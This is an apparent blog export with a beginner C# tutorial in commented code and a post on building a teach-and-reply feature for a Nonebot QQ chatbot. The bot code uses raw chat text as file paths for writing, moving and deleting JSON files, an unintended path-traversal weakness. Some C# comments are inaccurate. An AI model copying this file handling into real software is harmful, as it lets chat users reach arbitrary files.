class="string">&quot;还有吗&quot;</span>);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="comment">//这样写会有一个不影响编译的警告：warning CS0162: 检测到无法访问的代码</span></span><br><span class="line">                <span class="comment">//原因是：在switch语句中，没有匹配到执行的 case 中</span></span><br><span class="line">                <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line"></span><br><span class="line">                    Console.WriteLine(<span class="string">&quot;哈哈哈&quot;</span>);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">int</span> WhileNmuber = <span class="number">3</span>;</span><br><span class="line">            <span class="keyword">while</span> (WhileNmuber&gt;<span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                WhileNmuber--;</span><br><span class="line">                Console.WriteLine(<span class="string">&quot;减减&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//接下来是for循环捏</span></span><br><span class="line">            <span class="comment">//for ( init; condition; increment )</span></span><br><span class="line">            <span class="comment">//语法如上，意思就是，for (初始化；判断；increment )</span></span><br><span class="line">            <span class="comment">//执行完 init 执行 condition 执行完 condition 执行循环主体 执行完循环主体 执行increment</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i&lt;<span class="number">3</span>;)</span><br><span class="line">            &#123;</span><br><span class="line">                i++;</span><br><span class="line">                Console.WriteLine(<span class="string">&quot;原来是这样！&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//foreach循环语句</span></span><br><span class="line">            <span class="comment">//使用foreach可以迭代数组或者一个集合对象。</span></span><br><span class="line">            <span class="comment">//什么是迭代？ 迭代是重复反馈过程的活动，其目的通常是为了逼近所需目标或结果......</span></span><br><span class="line">            <span class="comment">//说人话：执行程序中的循环，直到满足某条件为止，亦称为迭代。</span></span><br><span class="line">            <span class="built_in">int</span>[] fibarray = <span class="keyword">new</span> <span class="built_in">int</span>[] &#123; <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">8</span>, <span class="number">13</span> &#125;;<span class="comment">//创建一个整型数组</span></span><br><span class="line">            <span class="keyword">foreach</span> (<span class="built_in">int</span> element <span class="keyword">in</span> fibarray)<span class="comment">//变量elementu遍历整个数组</span></span><br><span class="line"></span><br><span class="line">            &#123;</span><br><span class="line">                System.Console.WriteLine(element);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//元素计算器 ：很简单的实现方式</span></span><br><span class="line">            <span class="built_in">int</span> count = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">foreach</span> (<span class="built_in">int</span> element <span class="keyword">in</span> fibarray)</span><br><span class="line">            &#123;</span><br><span class="line">                count += <span class="number">1</span>;</span><br><span class="line">                System.Console.WriteLine(<span class="string">&quot;Element #&#123;0&#125;: &#123;1&#125;:&#123;2&#125;&quot;</span>, count, element, <span class="string">&quot;我去&quot;</span>, <span class="string">&quot;2333&quot;</span>);</span><br><span class="line">            &#125;                               <span class="comment">//两个占位符，表示后面有两个需要输出的代码，而且占位符无关位置</span></span><br><span class="line">                                            <span class="comment">//值得一提的是，如果多写了一个占位符，程序会直接崩溃，如果少写了一个占位符，仅仅只会少输出后面部分的内容</span></span><br><span class="line">                                            <span class="comment">//接下来是，Do while循环~</span></span><br><span class="line">                                            <span class="comment">//理解很简单，就是先执行一次，再从尾部检查条件，再判断是否执行。</span></span><br><span class="line">            <span class="keyword">do</span></span><br><span class="line">            &#123;</span><br><span class="line">                Console.WriteLine(<span class="string">&quot;欸嘿我先执行一次辣~&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">while</span> (<span class="number">0</span>&gt;<span class="number">1</span>);<span class="comment">//逆天写法</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">//哦对，C#中的循环也是可以嵌套的，不过我懒得写了。</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">//接下来是封装</span></span><br><span class="line">            <span class="comment">//神马是封装？封装 被定义为&quot;把一个或多个项目封闭在一个物理的或者逻辑的包中&quot;。</span></span><br><span class="line">            <span class="comment">//封装的意义：在面向对象程序设计方法论中，封装是为了防止对实现细节的访问。</span></span><br><span class="line">            <span class="comment">//抽象和封装是面向对象程序设计的相关特性。抽象允许相关信息可视化，封装则使开发者实现所需级别的抽象。</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">//如下是访问修饰符</span></span><br><span class="line">            <span class="comment">/*一个 访问修饰符 定义了一个类成员的范围和可见性。C# 支持的访问修饰符如下所示：</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">                   public：所有对象都可以访问；</span></span><br><span class="line"><span class="comment">                   private：对象本身在对象内部可以访问；</span></span><br><span class="line"><span class="comment">                   protected：只有该类对象及其子类对象可以访问</span></span><br><span class="line"><span class="comment">                   internal：同一个程序集的对象可以访问；</span></span><br><span class="line"><span class="comment">                   protected internal：访问限于当前程序集或派生自包含类的类型。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">            */</span></span><br><span class="line">            <span class="comment">//public中，即使是在一个类中，也可以通过public将函数暴露给其他成员</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">//Private 访问修饰符允许一个类将其成员变量和成员函数对其他的函数和对象进行隐藏。只有同一个类中的函数可以访问它的私有成员。即使是类的实例也不能访问它的私有成员。</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">//Protected 访问修饰符 Protected 访问修饰符允许子类访问它的基类的成员变量和成员函数。这样有助于实现继承。</span></span><br><span class="line">            <span class="comment">//什么是基类和成员函数呢？</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">//Internal 访问修饰符 Internal 访问修饰符允许一个类将其成员变量和成员函数暴露给当前程序中的其他函数和对象。</span></span><br><span class="line">            <span class="comment">//当前函数的</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">//接下来是 方法 捏~</span></span><br><span class="line">            <span class="comment">//&lt;Access Specifier&gt; &lt;Return Type&gt; &lt;Method Name&gt;(Parameter List)</span></span><br><span class="line">            <span class="comment">//格式如上</span></span><br><span class="line">            <span class="comment">//修饰符 返回类型 （不返回值的为void哦~） 方法名称 (括号里的参数捏)</span></span><br><span class="line">            <span class="comment">//欸嘿方法很简单辣</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">//懒得写代码了~</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">//递归方法调用</span></span><br><span class="line">            <span class="comment">//神马是递归呢 一个方法可以自我调用就是递归捏！</span></span><br><span class="line">            NumberManipulator n = <span class="keyword">new</span> NumberManipulator();</span><br><span class="line">            Console.WriteLine(<span class="string">&quot;6 的阶乘是： &#123;0&#125;&quot;</span>, n.factorial(<span class="number">6</span>));</span><br><span class="line"></span><br><span class="line">            <span class="built_in">int</span> NmubernullOne;<span class="comment">//这个默认为0</span></span><br><span class="line">            <span class="built_in">int</span>? NmubernullTwo;<span class="comment">//进行Null赋值，这个默认为null</span></span><br><span class="line">            Console.WriteLine();</span><br><span class="line">            <span class="comment">//被赋予了null 值的类型，称为可空类型，就是可以变成null的类型</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">//合并运算符 ??</span></span><br><span class="line">            <span class="comment">//如果第一个操作数的值为 null，则运算符返回第二个操作数的值，否则返回第一个操作数的值。下面的实例演示了这点：</span></span><br><span class="line">            <span class="built_in">double</span>? num1 = <span class="literal">null</span>;</span><br><span class="line">            <span class="built_in">double</span>? num2 = <span class="number">3.14157</span>;</span><br><span class="line">            <span class="built_in">double</span>? num3 = <span class="keyword">new</span> <span class="built_in">double</span>?();</span><br><span class="line">            num3 = num1 ?? num2;</span><br><span class="line">            Console.WriteLine(num3);</span><br><span class="line">            Console.WriteLine(num1 ?? num2);</span><br><span class="line">            <span class="comment">//C# 提供了一个特殊的数据类型，nullable 类型（可空类型），可空类型可以表示其基础值类型正常范围内的值，再加上一个 null 值。</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">//正好想到了，C#中上半部分的程序是否可以调用下半部分程序的方法呢</span></span><br><span class="line">            <span class="comment">//可是程序都是逐行阅读的来着？</span></span><br><span class="line">            <span class="comment">//经过实验，C#中是可以的，Python中我忘了行不行了</span></span><br><span class="line">            <span class="comment">//经过实验，Python中是不行的，因为Python是逐行阅读代码的脚本语言</span></span><br><span class="line">            <span class="comment">//这是一个处理数字的类，可以用来计算数学中的阶乘</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">//C#的数组</span></span><br><span class="line">            <span class="comment">//注意，数组不可以重复声明</span></span><br><span class="line">            <span class="comment">//声明一个数组</span></span><br><span class="line">            <span class="built_in">double</span>[] balanceOne;</span><br><span class="line">            <span class="comment">//声明一个数组不会在内存中初始化数组</span></span><br><span class="line">            <span class="built_in">double</span>[] balance = <span class="keyword">new</span> <span class="built_in">double</span>[<span class="number">10</span>];<span class="comment">//声明数组的长度</span></span><br><span class="line">            balance[<span class="number">0</span>] = <span class="number">4500.0</span>;<span class="comment">//然后单独赋值</span></span><br><span class="line"></span><br><span class="line">            <span class="built_in">double</span>[] balanceThree = &#123; <span class="number">2340.0</span>, <span class="number">4523.69</span>, <span class="number">3421.0</span> &#125;;<span class="comment">//声明的时候给数组赋值</span></span><br><span class="line"></span><br><span class="line">            <span class="built_in">int</span>[] marksOne = <span class="keyword">new</span> <span class="built_in">int</span>[<span class="number">5</span>] &#123; <span class="number">99</span>, <span class="number">98</span>, <span class="number">92</span>, <span class="number">97</span>, <span class="number">95</span> &#125;;<span class="comment">//可以创建并初始化一个数组</span></span><br><span class="line"></span><br><span class="line">            <span class="built_in">int</span>[] marksTwo = <span class="keyword">new</span> <span class="built_in">int</span>[] &#123; <span class="number">99</span>, <span class="number">98</span>, <span class="number">92</span>, <span class="number">97</span>, <span class="number">95</span> &#125;;<span class="comment">//可以省略数组的大小</span></span><br><span class="line"></span><br><span class="line">            <span class="built_in">int</span>[] marksThree = <span class="keyword">new</span> <span class="built_in">int</span>[] &#123; <span class="number">99</span>, <span class="number">98</span>, <span class="number">92</span>, <span class="number">97</span>, <span class="number">95</span> &#125;;<span class="comment">//可以将一个数组变量赋值给另一个数组变量</span></span><br><span class="line">            <span class="built_in">int</span>[] score = marksThree;</span><br><span class="line"></span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">            创建字符串的五种方法</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">            通过给 String 变量指定一个字符串</span></span><br><span class="line"><span class="comment">            通过使用 String 类构造函数</span></span><br><span class="line"><span class="comment">            通过使用字符串串联运算符（ + ）</span></span><br><span class="line"><span class="comment">            通过检索属性或调用一个返回字符串的方法</span></span><br><span class="line"><span class="comment">            通过格式化方法来转换一个值或对象为它的字符串表示形式</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">            */</span></span><br><span class="line"></span><br><span class="line">            String StringOne;</span><br><span class="line">            <span class="built_in">string</span> stringOne;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">             Console.ReadKey();<span class="comment">//这使得程序会等待一个按键的动作，防止程序从 Visual Studio .NET 启动时屏幕会快速运行并关闭。</span></span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">//枚举</span></span><br><span class="line">        <span class="comment">//什么是枚举</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">//包含很多变量的集合，可以调用集合</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         C#的枚举类型(Enum)是用来定义变量，这些变量表示一组人工定义的常量。使用枚举允许程序员有效地标识变量，并更容易地处理枚举值。例如，一个颜色枚举类型可以包括红、绿、蓝等常量值。</span></span><br><span class="line"><span class="comment"> </span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line"></span><br><span class="line">        <span class="built_in">enum</span> EnmuOne &#123; One, Two, Three, Four &#125;;</span><br><span class="line">        <span class="built_in">int</span> x = (<span class="built_in">int</span>)EnmuOne.One;</span><br><span class="line">        <span class="built_in">int</span> y = (<span class="built_in">int</span>)EnmuOne.Two;</span><br><span class="line">        <span class="comment">//枚举是这样的</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title">NumberManipulator</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="built_in">int</span> <span class="title">factorial</span>(<span class="params"><span class="built_in">int</span> num</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">/* 局部变量定义 */</span></span><br><span class="line">            <span class="built_in">int</span> result;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (num == <span class="number">1</span>)<span class="comment">//仅在num等于1的时候返回1让循环终止</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                result = factorial(num - <span class="number">1</span>) * num;</span><br><span class="line">                <span class="keyword">return</span> result;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>C#</category>
      </categories>
      <tags>
        <tag>基础</tag>
        <tag>C#</tag>
      </tags>
  </entry>
  <entry>
    <title>Nonebot创建聊天教学功能</title>
    <url>/2023/03/08/2023-3-8-Nonebot%E5%88%9B%E5%BB%BA%E8%81%8A%E5%A4%A9%E6%95%99%E5%AD%A6%E5%8A%9F%E8%83%BD/</url>
    <content><![CDATA[<h3 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h3><p>  在阅读前辈代码的时候我发现前辈们会专门的分出一个类专门进行数据处理相关的操作，于是我便顺着这个想法改进了我的代码。</p>
<p>  这使我项目代码的结构更为规整和简化，也提高了代码的可读性，在节省代码量的同时并没有影响工作效率。</p>
<h4 id="一、实现简易的教学功能"><a href="#一、实现简易的教学功能" class="headerlink" title="一、实现简易的教学功能"></a>一、实现简易的教学功能</h4><p>构建思路：制造一个词库，无非就是，将获取的消息存入指定的json文件中，在需要响应消息的时候查询是否有相关的消息，如果有则回复。</p>
<p>实现：在BOT收到 @LOVE酱 教学-XX&#x3D;XX 格式的消息时，会自动的分割消息，将教学内容和需要回复的词分开传参。</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> nonebot.adapters.onebot.v11 <span class="keyword">import</span> Event</span><br><span class="line"><span class="keyword">from</span> nonebot.adapters.onebot.v11.bot <span class="keyword">import</span> Bot</span><br><span class="line"><span class="keyword">from</span> nonebot.plugin.on <span class="keyword">import</span> on_command</span><br><span class="line"><span class="keyword">from</span> nonebot.rule <span class="keyword">import</span> to_me</span><br><span class="line"><span class="keyword">from</span> love.db <span class="keyword">import</span> JsonDB <span class="comment">#这一段尤为重要，正是在这一段中引入了我们处理数据库的类</span></span><br><span class="line"></span><br><span class="line">study = on_command(cmd=<span class="string">&#x27;教学-&#x27;</span>, rule=to_me(), priority=<span class="number">20</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@study.handle()</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">handle_func</span>(<span class="params">bot: Bot, event: Event</span>):</span><br><span class="line">    QQ = event.get_session_id().split(<span class="string">&#x27;_&#x27;</span>)[<span class="number">2</span>]  <span class="comment"># 获取QQ号</span></span><br><span class="line">    message = <span class="built_in">str</span>(event.get_message()).split(<span class="string">&#x27;-&#x27;</span>)[<span class="number">1</span>].split(<span class="string">&#x27;=&#x27;</span>)  <span class="comment"># 事件消息内容</span></span><br><span class="line">    send = message[<span class="number">0</span>]</span><br><span class="line">    Reply = message[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">    Save = JsonDB(QQ=QQ, send=send, Reply=Reply)</span><br><span class="line">    Save.Save()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">await</span> study.send(<span class="string">&#x27;教学成功！(请等待主人审核哦~)&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>实现操作json数据的类，起到心脏的作用。</p>
<p>将消息名作为文件名进行保存，再将消息存入json中，并记录时间和教学者的信息，</p>
<p>代码如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">JsonDB</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, QQ, send, Reply</span>):</span><br><span class="line">        self.QQ = QQ</span><br><span class="line">        self.send = send</span><br><span class="line">        self.Reply = Reply</span><br><span class="line"><span class="comment">#初始化</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#保存消息的方法</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">Save</span>(<span class="params">self</span>):</span><br><span class="line">        now = datetime.now()</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&quot;教学人&quot;</span>: self.QQ,</span><br><span class="line">            <span class="string">&quot;时间&quot;</span>: now.strftime(<span class="string">&quot;%Y-%m-%d %H:%M:%S&quot;</span>),</span><br><span class="line">            self.send: self.Reply</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">#构建json消息段</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">f&quot;<span class="subst">&#123;curPathTwo + self.send&#125;</span>.json&quot;</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> json_file:</span><br><span class="line">            json.dump(data, json_file)</span><br><span class="line">        <span class="comment">#将消息存入</span></span><br></pre></td></tr></table></figure>

<p>解决了保存，那么如何响应呢。</p>
<p>代码如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">Reply = on_command(cmd=<span class="string">&#x27;&#x27;</span>, rule=to_me(), priority=<span class="number">60</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@Reply.handle()</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">handle_func</span>(<span class="params">bot: Bot, event: Event</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(<span class="built_in">str</span>(event.get_message())) &gt;= <span class="number">1</span>:</span><br><span class="line"></span><br><span class="line">        Load = JsonDB(QQ=<span class="string">&#x27;&#x27;</span>, Reply=<span class="string">&#x27;&#x27;</span>, send=event.get_message())</span><br><span class="line"></span><br><span class="line">        <span class="keyword">await</span> Reply.send(Load.Load())</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        message = [<span class="string">&quot;你好，这里是LOVE酱，发送 帮助 可以查看我的功能哦！&quot;</span>,</span><br><span class="line">                   <span class="string">&quot;你好呀，我是LOVE酱，一个专为铁锈战争服务的虚拟少女！&quot;</span>,</span><br><span class="line">                   <span class="string">&quot;你好~有什么需要帮助的吗？&quot;</span>]</span><br><span class="line">        rnd = random.Random()</span><br><span class="line">        Num = rnd.randint(<span class="number">0</span>, <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">await</span>  Reply.send(message[Num])</span><br></pre></td></tr></table></figure>

<p>上面这段代码的作用是：在被艾特的时候随机响应一段回复词，而检测到字符串的时候便将字符串传参，实例化类并调用我们的写的查询方法，以此得到我们的回复词。</p>
<p>查询方法的代码如下：</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">Load</span>(<span class="params">self</span>):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># 从JSON文件中读取数据并解码为Python对象</span></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">f&quot;<span class="subst">&#123;curPath + self.send&#125;</span>.json&quot;</span>, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> json_file:</span><br><span class="line">            data = json.load(json_file)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> data[<span class="string">f&quot;<span class="subst">&#123;self.send&#125;</span>&quot;</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;LOVE酱现在还听不懂哦~可以教我吗？&quot;</span></span><br></pre></td></tr></table></figure>

<p>这里用到了一段异常处理：</p>
<ul>
<li><p>如果用户访问的文件存在，则会返回json中对应的键的值，也就是之前写入的字符串。</p>
</li>
<li><p>如果用户访问的文件并不存在，则说明这个词汇并没有被教学过，同时会引发异常，方法就会返回 “LOVE酱现在还听不懂哦~可以教我吗？” 这段字符串。</p>
</li>
</ul>
<h4 id="二、实现简易的审核功能"><a href="#二、实现简易的审核功能" class="headerlink" title="二、实现简易的审核功能"></a>二、实现简易的审核功能</h4><p>写到这里可能就会有人会问了，教学实现了，要是被教学了奇怪的话怎么办呀？能不能写一个审核机制？</p>
<p>当然是可以的。</p>
<p>我实现审核机制的原理是，将新教学的词先暂放到一个文件夹里，这个文件夹称为待审核文件夹，而这个文件夹里面的词汇是待审核词汇。在Master同意某个词汇后，就将词汇转移到过审文件夹中，而我们的响应方法只会去响应过审后文件夹里的词汇。这样，便成功的实现了简易的审核机制。</p>
<p>代码如下：</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">Examine = on_command(cmd=<span class="string">&#x27;查看待审核词汇&#x27;</span>, priority=<span class="number">20</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@Examine.handle()</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">handle_func</span>(<span class="params">bot: Bot, event: Event</span>):</span><br><span class="line">    QQ = event.get_session_id().split(<span class="string">&#x27;_&#x27;</span>)[<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">int</span>(QQ) != <span class="number">3345483363</span>:</span><br><span class="line"></span><br><span class="line">        <span class="keyword">await</span> Examine.send(<span class="string">&quot;你不是LOVE的主人哦~&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line"></span><br><span class="line">        curPath = os.path.abspath(os.path.pardir) + <span class="string">&quot;/LOVE/love/data/Examine/&quot;</span></span><br><span class="line">        listFiles = os.listdir(curPath)  <span class="comment"># 获取文件目录</span></span><br><span class="line">        message = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        QQ = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(listFiles)):</span><br><span class="line">            Load = JsonDB(QQ=QQ, Reply=<span class="string">&#x27;&#x27;</span>, send=listFiles[i])</span><br><span class="line">            Text = listFiles[i].split(<span class="string">&#x27;.&#x27;</span>)[<span class="number">0</span>] + <span class="string">&#x27;:&#x27;</span> + Load.ExamineLoad()</span><br><span class="line">            message += Text + <span class="string">&#x27;|&#x27;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">await</span> Examine.send(<span class="string">f&quot;待审核的词汇如下：<span class="subst">&#123;message&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>以上代码中，我们通过查看待审核文件夹中的文件，将文件名和文件中键对应的值提取出来组成字符串。就可以看到待审核的教学词汇。</p>
<p>实现移动文件和读取审核文件夹内名称的代码如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">curPathTwo = <span class="built_in">str</span>(os.path.abspath(os.path.pardir) + <span class="string">&quot;/LOVE/love/data/Examine/&quot;</span>).replace(<span class="string">&#x27;db/&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">ExamineLoad</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;读取待审核文件夹内的文件名&quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">f&quot;<span class="subst">&#123;curPathTwo + self.send&#125;</span>&quot;</span>, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> json_file:</span><br><span class="line">            data = json.load(json_file)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> data[<span class="string">f&quot;<span class="subst">&#123;<span class="built_in">str</span>(self.send).split(<span class="string">&#x27;.&#x27;</span>)[<span class="number">0</span>]&#125;</span>&quot;</span>]  <span class="comment"># 将文件名返回</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">MOVE</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;将文件转移实现通过审核&quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            shutil.move(curPathTwo + self.send, curPath)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            os.unlink(curPath + self.send)</span><br><span class="line">            shutil.move(curPathTwo + self.send, curPath)  <span class="comment"># 发现文件重复则删除文件</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="实现让用户自行撤回提交错误的词汇的功能"><a href="#实现让用户自行撤回提交错误的词汇的功能" class="headerlink" title="实现让用户自行撤回提交错误的词汇的功能"></a>实现让用户自行撤回提交错误的词汇的功能</h4><p>为了减轻Master的工作量，也为了提高用户体验。</p>
<p>我们考虑到用户有时候可能打错字，便增加了一个撤回的功能。</p>
<p>如果没用这个功能，而用户又想要删去这个提交错误的词汇，差不多就只能联系Master了，这样子很不方便。</p>
<p>而在实现功能中，我们需要考虑一点，那就是，需要实现只有发送这个词汇的人才能撤回这个词汇。</p>
<p>还记得我们存储数据使用的格式吗？忘了没关系，我们一起看看：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;教学人&quot;</span><span class="punctuation">:</span> self.QQ<span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;时间&quot;</span><span class="punctuation">:</span> now.strftime(<span class="string">&quot;%Y-%m-%d %H:%M:%S&quot;</span>)<span class="punctuation">,</span></span><br><span class="line">    self.send<span class="punctuation">:</span> self.Reply</span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>在我们存储的每一个词汇的json文件里，我们有三个键，教学人、时间、以及接受词。分别对应QQ、时间、回复词。</p>
<p>而解决用户直接身份甄别的关键就在此处，那就是json中的教学人，只要我们将其于发送消息者的QQ进行对比，就可以看出这个词是不是教学人创建的。</p>
<p>ps: 有一个BUG可以卡，就是下一个人创建的词会覆盖上一个人的内容。）</p>
<p>话不多说，上代码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">recall = on_command(cmd=<span class="string">&#x27;撤回-&#x27;</span>, rule=to_me(), priority=<span class="number">20</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@recall.handle()</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">handle_func</span>(<span class="params">bot: Bot, event: Event</span>):</span><br><span class="line">    QQ = event.get_session_id().split(<span class="string">&#x27;_&#x27;</span>)[<span class="number">2</span>]  <span class="comment"># 获取QQ号</span></span><br><span class="line">    message = <span class="built_in">str</span>(event.get_message()).split(<span class="string">&#x27;-&#x27;</span>)[<span class="number">1</span>]  <span class="comment"># 事件消息内容</span></span><br><span class="line">    send = message</span><br><span class="line"></span><br><span class="line">    REC = JsonDB(QQ=QQ, send=send, Reply=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">await</span> recall.send(REC.recall())</span><br></pre></td></tr></table></figure>

<p>然后是在类中实现的代码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">recall</span>(<span class="params">self</span>):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># 从JSON文件中读取数据并解码为Python对象</span></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">f&quot;<span class="subst">&#123;curPathTwo + self.send&#125;</span>.json&quot;</span>, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> json_file:</span><br><span class="line">            data = json.load(json_file)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> self.QQ == data[<span class="string">&#x27;教学人&#x27;</span>]:</span><br><span class="line">            os.remove(curPathTwo + self.send+<span class="string">&#x27;.json&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;已成功撤回词汇&#x27;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;您并不是这个词汇的教学人哦~&#x27;</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;您并没有提交过这个词汇哦~&#x27;</span></span><br></pre></td></tr></table></figure>



]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>Json</tag>
      </tags>
  </entry>
  <entry>
    <title>Flask[初见]</title>
